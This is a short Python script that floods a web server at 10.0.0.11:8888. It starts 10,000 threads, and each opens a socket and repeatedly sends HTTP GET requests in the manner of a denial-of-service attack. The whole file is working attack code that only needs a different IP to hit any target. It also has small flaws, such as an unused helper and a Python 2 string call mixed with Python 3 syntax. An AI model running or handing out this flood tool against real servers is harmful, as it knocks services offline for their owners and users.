# -*- coding: utf-8 -*-
import random
import socket
import string
import sys
import threading
import time

host = "Host: 10.0.0.11:8888"
port=8888
n_request = 10000
ip ="10.0.0.11"




def gen_url():
    msg = str(string.letters + string.digits)
    data = "".join(random.sample(msg, 8))
    return data


def attack():
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        soc.connect((ip, port))
        req = "GET / HTTP/1.1\r\n"+host+"\r\n\r\n"
        for i in range(10):
             soc.send(req.encode())
    except socket.error as e:
        print("\n ! no connexion: " + str(e))
    finally:
        soc.shutdown(socket.SHUT_RDWR)
        soc.close()
print("attack on "+ip)

threads = []
for i in range(n_request):
    print(str(i),end="\r")
    t= threading.Thread(target=attack)
    t.start()
    threads.append(t)
    time.sleep(0.001)

